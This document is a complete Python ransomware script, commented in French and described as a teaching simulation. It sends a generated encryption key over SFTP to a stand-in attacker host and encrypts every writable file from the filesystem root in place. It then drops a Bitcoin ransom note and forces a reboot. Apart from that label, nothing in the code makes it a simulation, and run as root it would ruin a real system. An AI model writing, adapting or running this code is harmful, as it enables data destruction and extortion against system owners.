#!/usr/bin/env python3
# ransomware_total.py - Simulation pédagogique de ransomware Linux

import os
import sys
import logging
from pathlib import Path
from cryptography.fernet import Fernet
import paramiko
import socket
import subprocess
from datetime import datetime

# Configuration
LOG_FILE = "/var/log/ransomware_sim.log"
SFTP_SERVER = "attacker.example.com"  # À remplacer par votre serveur de test
SFTP_USER = "exfil"
SFTP_PASS = "password123"  # En réel: utiliser clé SSH
SFTP_PORT = 22
SFTP_REMOTE_PATH = "/exfil/keys"
RANSOM_NOTE = "/root/README_RANSOM.txt"

# Setup logging
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)


def check_root():
    """Vérifie que le script est exécuté en root"""
    if os.geteuid() != 0:
        logging.error("Le script doit être exécuté en tant que root!")
        sys.exit(1)


def generate_key():
    """Génère une clé de chiffrement Fernet"""
    try:
        key = Fernet.generate_key()
        logging.info(f"Clé générée: {key.decode()}")
        return key
    except Exception as e:
        logging.error(f"Erreur génération clé: {str(e)}")
        sys.exit(1)


def exfiltrate_key(key):
    """Transmet la clé via SFTP"""
    try:
        transport = paramiko.Transport((SFTP_SERVER, SFTP_PORT))
        transport.connect(username=SFTP_USER, password=SFTP_PASS)
        sftp = paramiko.SFTPClient.from_transport(transport)

        hostname = socket.gethostname()
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        remote_filename = f"{hostname}_{timestamp}.key"

        with sftp.file(f"{SFTP_REMOTE_PATH}/{remote_filename}", 'w') as f:
            f.write(key)

        sftp.close()
        transport.close()
        logging.info(f"Clé exfiltrée vers {SFTP_SERVER}/{remote_filename}")
    except Exception as e:
        logging.error(f"Échec exfiltration: {str(e)}")
        sys.exit(1)


def encrypt_file(filepath, fernet):
    """Chiffre un fichier en place"""
    try:
        with open(filepath, 'rb') as f:
            data = f.read()

        encrypted_data = fernet.encrypt(data)

        with open(filepath, 'wb') as f:
            f.write(encrypted_data)

        logging.debug(f"Fichier chiffré: {filepath}")
    except Exception as e:
        logging.warning(f"Échec chiffrement {filepath}: {str(e)}")


def should_encrypt(path):
    """Détermine si un fichier doit être chiffré"""
    # Exclusions (optionnelles pour la simulation)
    exclusions = [
        '/proc/', '/sys/', '/dev/', '/run/',
        LOG_FILE, RANSOM_NOTE, __file__
    ]

    path_str = str(path)
    return all(excl not in path_str for excl in exclusions)


def encrypt_system(fernet):
    """Parcourt et chiffre le système de fichiers"""
    logging.info("Début du chiffrement du système...")

    for root, dirs, files in os.walk('/'):
        for file in files:
            filepath = os.path.join(root, file)
            if should_encrypt(filepath):
                try:
                    if os.path.isfile(filepath) and os.access(filepath, os.W_OK):
                        encrypt_file(filepath, fernet)
                except Exception as e:
                    logging.warning(f"Erreur traitement {filepath}: {str(e)}")
                    continue


def create_ransom_note(key):
    """Crée un fichier de demande de rançon"""
    note = f"""
    ⚠️ VOTRE SYSTÈME A ÉTÉ CHIFFRÉ ⚠️

    Pour récupérer vos fichiers, vous devez:
    1. Payer 0.001 Bitcoin à l'adresse: FAKE_BTC_ADDRESS
    2. Envoyer un email à ransomware@example.com avec votre ID: {key[:8]}...

    Toute tentative de récupération sans paiement entraînera la destruction de la clé!
    """

    try:
        with open(RANSOM_NOTE, 'w') as f:
            f.write(note)
        logging.info("Note de rançon créée")
    except Exception as e:
        logging.error(f"Erreur création note: {str(e)}")


def reboot_system():
    """Redémarre le système"""
    logging.info("Préparation du redémarrage...")
    try:
        subprocess.run(['shutdown', '-r', 'now'], check=True)
    except Exception as e:
        logging.error(f"Échec redémarrage: {str(e)}")
        sys.exit(1)


def main():
    check_root()
    logging.info("=== Début de la simulation ransomware ===")

    # Étape 1: Génération clé
    key = generate_key()
    fernet = Fernet(key)

    # Étape 2: Exfiltration
    exfiltrate_key(key)

    # Étape 3: Chiffrement
    encrypt_system(fernet)

    # Étape 4: Note de rançon
    create_ransom_note(key.decode())

    # Étape 5: Redémarrage
    reboot_system()


if __name__ == "__main__":
    main()